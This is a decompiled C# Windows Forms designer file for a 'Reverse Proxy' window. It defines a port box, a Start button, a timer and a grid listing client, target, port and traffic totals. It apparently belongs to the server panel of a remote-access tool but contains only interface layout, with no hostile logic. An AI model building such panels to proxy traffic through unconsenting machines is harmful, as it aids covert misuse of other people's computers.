namespace Server.Forms
{
	// Token: 0x020000C0 RID: 192
	public partial class FormReverseProxy : global::Server.Helper.FormMaterial
	{
		// Token: 0x06000643 RID: 1603 RVA: 0x0005B194 File Offset: 0x00059394
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000644 RID: 1604 RVA: 0x0005B1B4 File Offset: 0x000593B4
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Forms.FormReverseProxy));
			this.rjTextBox1 = new global::CustomControls.RJControls.RJTextBox();
			this.rjButton1 = new global::CustomControls.RJControls.RJButton();
			this.GridIps = new global::System.Windows.Forms.DataGridView();
			this.ColumnClient = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.ColumnTarget = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.ColumnTargetPort = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.ColumnTotalRecived = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.ColumnTotalSent = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.panel1 = new global::System.Windows.Forms.Panel();
			((global::System.ComponentModel.ISupportInitialize)this.GridIps).BeginInit();
			base.SuspendLayout();
			this.rjTextBox1.BackColor = global::System.Drawing.Color.White;
			this.rjTextBox1.BorderColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjTextBox1.BorderFocusColor = global::System.Drawing.Color.Yellow;
			this.rjTextBox1.BorderRadius = 0;
			this.rjTextBox1.BorderSize = 1;
			this.rjTextBox1.Enabled = false;
			this.rjTextBox1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.rjTextBox1.ForeColor = global::System.Drawing.Color.Black;
			this.rjTextBox1.Location = new global::System.Drawing.Point(7, 69);
			this.rjTextBox1.Margin = new global::System.Windows.Forms.Padding(4);
			this.rjTextBox1.Multiline = false;
			this.rjTextBox1.Name = "rjTextBox1";
			this.rjTextBox1.Padding = new global::System.Windows.Forms.Padding(10, 7, 10, 7);
			this.rjTextBox1.PasswordChar = false;
			this.rjTextBox1.PlaceholderColor = global::System.Drawing.Color.DarkGray;
			this.rjTextBox1.PlaceholderText = "Port";
			this.rjTextBox1.Size = new global::System.Drawing.Size(92, 28);
			this.rjTextBox1.TabIndex = 2;
			this.rjTextBox1.Texts = "4680";
			this.rjTextBox1.UnderlinedStyle = false;
			this.rjButton1.BackColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton1.BackgroundColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton1.BorderColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton1.BorderRadius = 0;
			this.rjButton1.BorderSize = 0;
			this.rjButton1.Enabled = false;
			this.rjButton1.FlatAppearance.BorderSize = 0;
			this.rjButton1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.rjButton1.ForeColor = global::System.Drawing.Color.White;
			this.rjButton1.Location = new global::System.Drawing.Point(106, 69);
			this.rjButton1.Name = "rjButton1";
			this.rjButton1.Size = new global::System.Drawing.Size(92, 27);
			this.rjButton1.TabIndex = 3;
			this.rjButton1.Text = "Start";
			this.rjButton1.TextColor = global::System.Drawing.Color.White;
			this.rjButton1.UseVisualStyleBackColor = false;
			this.rjButton1.Click += new global::System.EventHandler(this.rjButton1_Click);
			this.GridIps.AllowUserToAddRows = false;
			this.GridIps.AllowUserToDeleteRows = false;
			this.GridIps.AllowUserToResizeColumns = false;
			this.GridIps.AllowUserToResizeRows = false;
			this.GridIps.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
			this.GridIps.BackgroundColor = global::System.Drawing.Color.White;
			this.GridIps.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.GridIps.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.None;
			this.GridIps.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
			dataGridViewCellStyle.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle.SelectionBackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.SelectionForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.GridIps.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
			this.GridIps.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.GridIps.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
			{
				this.ColumnClient,
				this.ColumnTarget,
				this.ColumnTargetPort,
				this.ColumnTotalRecived,
				this.ColumnTotalSent
			});
			this.GridIps.Cursor = global::System.Windows.Forms.Cursors.Default;
			dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle2.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
			this.GridIps.DefaultCellStyle = dataGridViewCellStyle2;
			this.GridIps.Enabled = false;
			this.GridIps.EnableHeadersVisualStyles = false;
			this.GridIps.GridColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			this.GridIps.Location = new global::System.Drawing.Point(6, 104);
			this.GridIps.Name = "GridIps";
			this.GridIps.ReadOnly = true;
			this.GridIps.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle3.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle3.BackColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			dataGridViewCellStyle3.ForeColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle3.Padding = new global::System.Windows.Forms.Padding(1, 0, 0, 0);
			dataGridViewCellStyle3.SelectionBackColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle3.SelectionForeColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle3.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.GridIps.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
			this.GridIps.RowHeadersVisible = false;
			this.GridIps.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.GridIps.ShowCellErrors = false;
			this.GridIps.ShowCellToolTips = false;
			this.GridIps.ShowEditingIcon = false;
			this.GridIps.ShowRowErrors = false;
			this.GridIps.Size = new global::System.Drawing.Size(547, 333);
			this.GridIps.TabIndex = 14;
			this.ColumnClient.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.ColumnClient.HeaderText = "Client";
			this.ColumnClient.MinimumWidth = 80;
			this.ColumnClient.Name = "ColumnClient";
			this.ColumnClient.ReadOnly = true;
			this.ColumnClient.Width = 80;
			this.ColumnTarget.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.ColumnTarget.HeaderText = "Target";
			this.ColumnTarget.MinimumWidth = 80;
			this.ColumnTarget.Name = "ColumnTarget";
			this.ColumnTarget.ReadOnly = true;
			this.ColumnTarget.Width = 80;
			this.ColumnTargetPort.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.ColumnTargetPort.HeaderText = "Target Port";
			this.ColumnTargetPort.MinimumWidth = 120;
			this.ColumnTargetPort.Name = "ColumnTargetPort";
			this.ColumnTargetPort.ReadOnly = true;
			this.ColumnTargetPort.Width = 120;
			this.ColumnTotalRecived.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.ColumnTotalRecived.HeaderText = "Total Recived";
			this.ColumnTotalRecived.MinimumWidth = 120;
			this.ColumnTotalRecived.Name = "ColumnTotalRecived";
			this.ColumnTotalRecived.ReadOnly = true;
			this.ColumnTotalRecived.Width = 120;
			this.ColumnTotalSent.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
			this.ColumnTotalSent.HeaderText = "Total Sent";
			this.ColumnTotalSent.Name = "ColumnTotalSent";
			this.ColumnTotalSent.ReadOnly = true;
			this.timer1.Interval = 1000;
			this.timer1.Tick += new global::System.EventHandler(this.timer1_Tick);
			this.panel1.BackColor = global::System.Drawing.Color.White;
			this.panel1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.panel1.Location = new global::System.Drawing.Point(3, 64);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(554, 376);
			this.panel1.TabIndex = 15;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.White;
			base.ClientSize = new global::System.Drawing.Size(560, 443);
			base.Controls.Add(this.GridIps);
			base.Controls.Add(this.rjTextBox1);
			base.Controls.Add(this.rjButton1);
			base.Controls.Add(this.panel1);
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			this.MinimumSize = new global::System.Drawing.Size(560, 443);
			base.Name = "FormReverseProxy";
			this.Text = "Reverse Proxy";
			base.Load += new global::System.EventHandler(this.RemoteDesktop_Load);
			((global::System.ComponentModel.ISupportInitialize)this.GridIps).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x0400051C RID: 1308
		private global::System.ComponentModel.IContainer components;

		// Token: 0x0400051D RID: 1309
		public global::CustomControls.RJControls.RJButton rjButton1;

		// Token: 0x0400051E RID: 1310
		public global::System.Windows.Forms.DataGridView GridIps;

		// Token: 0x0400051F RID: 1311
		private global::System.Windows.Forms.DataGridViewTextBoxColumn ColumnClient;

		// Token: 0x04000520 RID: 1312
		private global::System.Windows.Forms.DataGridViewTextBoxColumn ColumnTarget;

		// Token: 0x04000521 RID: 1313
		private global::System.Windows.Forms.DataGridViewTextBoxColumn ColumnTargetPort;

		// Token: 0x04000522 RID: 1314
		private global::System.Windows.Forms.DataGridViewTextBoxColumn ColumnTotalRecived;

		// Token: 0x04000523 RID: 1315
		private global::System.Windows.Forms.DataGridViewTextBoxColumn ColumnTotalSent;

		// Token: 0x04000524 RID: 1316
		private global::System.Windows.Forms.Timer timer1;

		// Token: 0x04000525 RID: 1317
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x04000526 RID: 1318
		public global::CustomControls.RJControls.RJTextBox rjTextBox1;
	}
}
